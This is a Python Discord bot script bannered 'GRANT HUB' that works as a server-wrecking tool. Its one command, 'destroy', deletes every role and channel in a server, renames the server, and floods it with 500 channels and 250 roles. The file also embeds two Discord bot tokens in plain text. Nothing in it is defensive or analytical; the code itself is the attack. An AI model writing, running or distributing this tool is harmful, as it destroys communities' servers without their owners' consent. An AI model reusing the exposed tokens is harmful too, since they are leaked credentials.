import discord
from discord.ext import commands
from discord.utils import get
print("		                                                                 ")
print("░██████╗░██████╗░░█████╗░███╗░░██╗████████╗  ██╗░░██╗██╗░░░██╗██████╗░")
print("██╔════╝░██╔══██╗██╔══██╗████╗░██║╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗")
print("██║░░██╗░██████╔╝███████║██╔██╗██║░░░██║░░░  ███████║██║░░░██║██████╦╝")
print("██║░░╚██╗██╔══██╗██╔══██║██║╚████║░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗")
print("╚██████╔╝██║░░██║██║░░██║██║░╚███║░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝")
print("░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░")
texts = "GrantHubNo1"
bot = commands.Bot(command_prefix="$sudo ", cas_insentive=True, help_command=None)
token = 'OTg0NDM1MTAxMTU0ODA3ODg5.G82xqg.FFeAzS52UkloXaGrLTfb0641P_NZEQzLl5JGxU'
text = texts
name = text
names = name
@bot.command()
async def destroy(ctx):
    guild = ctx.message.guild
    for role in ctx.guild.roles:  
        try:  
            await role.delete()
            print("Delete Role")
        except:
            pass
    await ctx.guild.edit(name=name)
    for c in ctx.guild.channels:
        try:  
            await c.delete() 
            print("Delete Channel")
        except:
            pass
    print("Change Name")
    for i in range(500):
        try:
            await guild.create_text_channel(name)
            print("Create Channel")
        except:
            pass
    for i in range(250):
        try:
            await guild.create_role(name=names)
            print("Create Role")
        except:
            pass
bot.run('OTg0NDM1MTAxMTU0ODA3ODg5.GEEcJ6.03xoL2ZGGBluiFqT2PTEOE_pMkZQlNI77xJMkg')